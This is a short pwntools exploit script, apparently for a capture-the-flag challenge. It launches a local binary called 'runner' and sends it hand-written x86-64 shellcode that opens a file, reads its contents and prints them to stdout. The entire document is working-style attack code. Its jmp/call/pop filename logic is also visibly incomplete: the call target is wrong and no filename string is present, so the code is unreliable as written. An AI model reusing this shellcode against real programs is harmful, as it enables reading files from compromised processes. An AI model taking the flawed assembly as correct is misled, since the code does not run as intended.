from pwn import *
context.binary = ELF("./runner")

r = process()

shellcode = asm("""
    jmp     short call_filename
    pop     rdi
    xor     byte ptr [rdi + 0xd0], 0x41
    xor     rax, rax
    add     al, 2              # syscall number for open
    xor     rsi, rsi           # O_RDONLY
    syscall

    sub     rsp, 0xfff
    lea     rsi, [rsp]
    mov     rdi, rax           # file descriptor
    xor     rdx, rdx
    mov     dx, 0xfff
    xor     rax, rax           # syscall number for read
    syscall

    xor     rdi, rdi
    add     dil, 1             # stdout
    mov     rdx, rax           # number of bytes read
    xor     rax, rax
    add     al, 1              # syscall number for write
    syscall

    xor     rax, rax
    add     al, 0x3c           # syscall number for exit
    syscall

call_filename:
    call    2
""")

print(len(shellcode))
r.sendline(shellcode)
r.interactive()
